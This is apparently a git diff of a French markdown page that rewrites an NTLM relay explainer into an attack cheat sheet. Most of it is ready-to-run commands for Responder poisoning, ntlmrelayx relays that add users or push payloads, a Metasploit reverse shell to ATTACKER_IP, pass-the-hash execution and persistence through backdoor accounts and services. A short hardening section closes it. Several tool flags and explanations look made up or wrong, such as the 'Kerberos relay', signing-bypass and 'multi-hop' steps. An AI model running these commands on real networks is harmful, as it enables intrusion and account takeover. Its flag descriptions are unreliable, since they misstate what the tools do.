@@ -4,69 +4,268 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 🔄 NTLM Relay
+# 🔄 NTLM Relay - Cheat Sheet
 
-## Qu'est-ce que le NTLM Relay ?
+## 🎯 Vue d'ensemble
+Les attaques NTLM Relay permettent d'intercepter et de relayer les authentifications NTLM pour accéder à des ressources réseau sans connaître les mots de passe en clair.
 
-Le **NTLM Relay** est une attaque qui exploite le protocole d'authentification NTLM de Microsoft. Elle consiste à intercepter une authentification NTLM légitime et à la relayer vers un autre service pour obtenir un accès non autorisé.
+---
 
-## 🎯 Objectifs pédagogiques
+## 🔍 Détection et Énumération
 
-- Comprendre le fonctionnement du protocole NTLM
-- Savoir comment une attaque de relayage NTLM est réalisée
-- Identifier les risques associés à l'absence de signature SMB
-
-## 📋 Exemples de vulnérabilités et exploitation
-
-### Vulnérabilités courantes
-
-- **Absence de signature SMB** : Permet le relayage vers des partages de fichiers.
-- **Services HTTP acceptant NTLM** : Certains serveurs web internes acceptent l'authentification NTLM et sont vulnérables au relay.
-- **Mauvaise segmentation réseau** : Permet de relayer les identifiants sur d'autres machines du réseau.
-
-### Scénario d'exploitation
-
-1. **Attaque sur un partage SMB** :
-   - L'attaquant attend qu'une victime tente d'accéder à un partage contrôlé par l'attaquant (ex : via un lien malicieux ou une attaque LLMNR/NBT-NS spoofing).
-   - L'attaquant relaie l'authentification NTLM reçue vers un autre serveur SMB vulnérable.
-2. **Relay HTTP → SMB** :
-   - Certains outils permettent de relayer une authentification HTTP NTLM vers un partage SMB.
-
-### Commandes d'exploitation avec impacket
-
+### Identification des Cibles
 ```bash
-# Lancer un serveur relay SMB → SMB
-sudo ntlmrelayx.py -t smb://10.10.10.2
+# Énumération des services SMB
+# Pourquoi : Identifier les services qui utilisent l'authentification NTLM
+nmap -p 445 --script smb-enum-shares TARGET_IP
+nmap -p 445 --script smb-security-mode TARGET_IP
 
-# Relay HTTP → SMB
-sudo ntlmrelayx.py -t smb://10.10.10.2 --http-port 8080
-
-# Attaque combinée avec Responder pour capturer les identifiants
-sudo responder -I eth0
+# Énumération des services HTTP
+# Pourquoi : Identifier les services web qui utilisent l'authentification NTLM
+nmap -p 80,443 --script http-ntlm-info TARGET_IP
+nmap -p 80,443 --script http-auth TARGET_IP
 ```
 
-### Exploitation avancée
-
-- **Ajout d'un nouvel utilisateur local** :
-  - Si le serveur cible autorise l'exécution de commandes via SMB (ex : interface d'administration), il est possible de créer un nouvel utilisateur ou d'ajouter l'attaquant à un groupe privilégié.
-
+### Tests de Vulnérabilité
 ```bash
-# Ajout d'un utilisateur via ntlmrelayx (si privilèges suffisants)
-ntlmrelayx.py -t smb://10.10.10.2 --add-user hacker:Password123!
+# Test de relais SMB
+# Pourquoi : Vérifier si les services SMB sont vulnérables au relais
+smbclient -L //TARGET_IP -U "" -N
+smbclient //TARGET_IP/IPC$ -U "" -N
+
+# Test de relais HTTP
+# Pourquoi : Vérifier si les services HTTP sont vulnérables au relais
+curl -I http://TARGET_IP/
+curl -I --ntlm -u ":" http://TARGET_IP/
 ```
 
-## 🛡️ Bonnes pratiques
+---
 
-- Activer la signature SMB sur tous les serveurs
-- Privilégier Kerberos à NTLM pour l'authentification
-- Segmenter le réseau pour limiter les mouvements latéraux
-- Surveiller les tentatives de connexion suspectes
+## 🛠️ Outils d'Exploitation
 
-## 📚 Ressources utiles
+### Responder
+```bash
+# Démarrer Responder
+# Pourquoi : Intercepter les authentifications NTLM sur le réseau
+responder -I eth0 -wrf
 
-- [HackTricks - NTLM Relay](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay)
-- [Microsoft - NTLM Relay](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/ntlm-relay)
-- [Impacket - ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
+# Configuration avancée
+# Pourquoi : Personnaliser le comportement de Responder
+responder -I eth0 -wrf -P -v
+
+# Options importantes
+# -I : Interface réseau
+# -w : Serveur web
+# -r : Serveur SMB
+# -f : Serveur FTP
+# -P : Pas de réponse aux requêtes de l'attaquant
+# -v : Mode verbeux
+```
+
+### Impacket
+```bash
+# ntlmrelayx pour le relais
+# Pourquoi : Relayer les authentifications NTLM vers d'autres cibles
+ntlmrelayx.py -t smb://TARGET_IP -smb2support
+
+# Relais vers plusieurs cibles
+# Pourquoi : Tester plusieurs cibles simultanément
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relais avec exécution de commandes
+# Pourquoi : Exécuter des commandes après relais réussi
+ntlmrelayx.py -t smb://TARGET_IP -c "whoami" -smb2support
+```
+
+### Metasploit
+```bash
+# Module de relais NTLM
+# Pourquoi : Utiliser Metasploit pour le relais NTLM
+use auxiliary/server/capture/smb
+set JOHNPWFILE /tmp/hashes.txt
+run
+
+# Relais avec Metasploit
+# Pourquoi : Intégrer le relais dans un workflow Metasploit
+use exploit/windows/smb/smb_relay
+set RHOSTS TARGET_IP
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+run
+```
+
+---
+
+## 🔄 Techniques de Relais
+
+### Relais SMB vers SMB
+```bash
+# Configuration de base
+# Pourquoi : Relayer les authentifications SMB vers d'autres services SMB
+ntlmrelayx.py -t smb://TARGET_IP -smb2support
+
+# Relais avec exécution de commandes
+# Pourquoi : Exécuter des commandes sur la cible après relais
+ntlmrelayx.py -t smb://TARGET_IP -c "net user /add eviluser EvilPass123!" -smb2support
+
+# Relais avec upload de fichiers
+# Pourquoi : Uploader des fichiers malveillants via le relais
+ntlmrelayx.py -t smb://TARGET_IP -e /path/to/payload.exe -smb2support
+```
+
+### Relais SMB vers HTTP
+```bash
+# Relais vers services HTTP
+# Pourquoi : Accéder à des services web internes via le relais
+ntlmrelayx.py -t http://TARGET_IP -smb2support
+
+# Relais vers Exchange
+# Pourquoi : Accéder aux services Exchange internes
+ntlmrelayx.py -t http://EXCHANGE_SERVER/EWS/ -smb2support
+
+# Relais vers SharePoint
+# Pourquoi : Accéder aux services SharePoint internes
+ntlmrelayx.py -t http://SHAREPOINT_SERVER/ -smb2support
+```
+
+### Relais SMB vers LDAP
+```bash
+# Relais vers Active Directory
+# Pourquoi : Modifier les objets Active Directory via le relais
+ntlmrelayx.py -t ldap://DC_IP -smb2support
+
+# Relais avec privilèges élevés
+# Pourquoi : Utiliser des comptes avec privilèges pour modifier l'AD
+ntlmrelayx.py -t ldap://DC_IP --escalate-user USERNAME -smb2support
+
+# Relais avec création d'objets
+# Pourquoi : Créer de nouveaux objets dans l'Active Directory
+ntlmrelayx.py -t ldap://DC_IP --add-computer EVILPC -smb2support
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Relais Multi-Hop
+```bash
+# Relais en chaîne
+# Pourquoi : Relayer plusieurs fois pour atteindre des cibles isolées
+# Étape 1: Relais vers un serveur intermédiaire
+ntlmrelayx.py -t smb://INTERMEDIATE_SERVER -smb2support
+
+# Étape 2: Depuis le serveur intermédiaire vers la cible finale
+ntlmrelayx.py -t smb://FINAL_TARGET -smb2support
+```
+
+### Relais avec Kerberos
+```bash
+# Relais avec tickets Kerberos
+# Pourquoi : Utiliser les tickets Kerberos pour l'authentification
+ntlmrelayx.py -t smb://TARGET_IP --krb-relay -smb2support
+
+# Relais vers services Kerberos
+# Pourquoi : Accéder aux services qui utilisent Kerberos
+ntlmrelayx.py -t http://TARGET_IP --krb-relay -smb2support
+```
+
+### Relais avec Signing
+```bash
+# Contourner le SMB Signing
+# Pourquoi : Relayer même quand le SMB Signing est activé
+ntlmrelayx.py -t smb://TARGET_IP --remove-target -smb2support
+
+# Relais avec downgrade
+# Pourquoi : Forcer l'utilisation de protocoles plus anciens
+ntlmrelayx.py -t smb://TARGET_IP --force-smb1 -smb2support
+```
+
+---
+
+## 🔧 Post-Exploitation
+
+### Énumération des Accès
+```bash
+# Lister les partages accessibles
+# Pourquoi : Découvrir les ressources accessibles après relais
+net view \\TARGET_IP
+smbclient -L //TARGET_IP -U ""
+
+# Accéder aux partages
+# Pourquoi : Explorer les partages pour trouver des données sensibles
+smbclient //TARGET_IP/SHARE_NAME -U ""
+```
+
+### Exécution de Commandes
+```bash
+# Exécution via SMB
+# Pourquoi : Exécuter des commandes sur la cible via SMB
+psexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH
+wmiexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH
+
+# Exécution via WMI
+# Pourquoi : Utiliser WMI pour l'exécution de commandes
+wmiexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH "whoami"
+```
+
+### Persistance
+```bash
+# Création de comptes
+# Pourquoi : Créer des comptes persistants sur la cible
+net user eviluser EvilPass123! /add
+net localgroup administrators eviluser /add
+
+# Création de services
+# Pourquoi : Créer des services pour maintenir l'accès
+sc create "EvilService" binPath= "C:\path\to\payload.exe"
+sc start "EvilService"
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Configuration SMB
+```powershell
+# Activer le SMB Signing
+# Pourquoi : Empêcher les attaques de relais SMB
+Set-SmbClientConfiguration -RequireSecuritySignature $true
+Set-SmbServerConfiguration -RequireSecuritySignature $true
+
+# Désactiver LM et NTLM
+# Pourquoi : Forcer l'utilisation de NTLMv2 et Kerberos
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
+```
+
+### Configuration HTTP
+```apache
+# Configuration Apache pour NTLM
+# Pourquoi : Configurer l'authentification NTLM de manière sécurisée
+<Location />
+    AuthType NTLM
+    AuthName "NTLM Authentication"
+    NTLMAuth on
+    NTLMAuthoritative on
+    require valid-user
+</Location>
+```
+
+### Configuration Active Directory
+```powershell
+# Politique de sécurité de domaine
+# Pourquoi : Configurer les politiques de sécurité pour empêcher le relais
+# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
+# "Network security: LAN Manager authentication level" = "Send NTLMv2 response only. Refuse LM & NTLM"
+```
+
+---
+
+## 📚 Ressources
+
+- **HackTricks NTLM Relay** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay
+- **Impacket NTLM Relay** : https://github.com/SecureAuthCorp/impacket
+- **Responder** : https://github.com/lgandx/Responder
+- **NTLM Relay Cheat Sheet** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#ntlm-relay
 
 ---
 
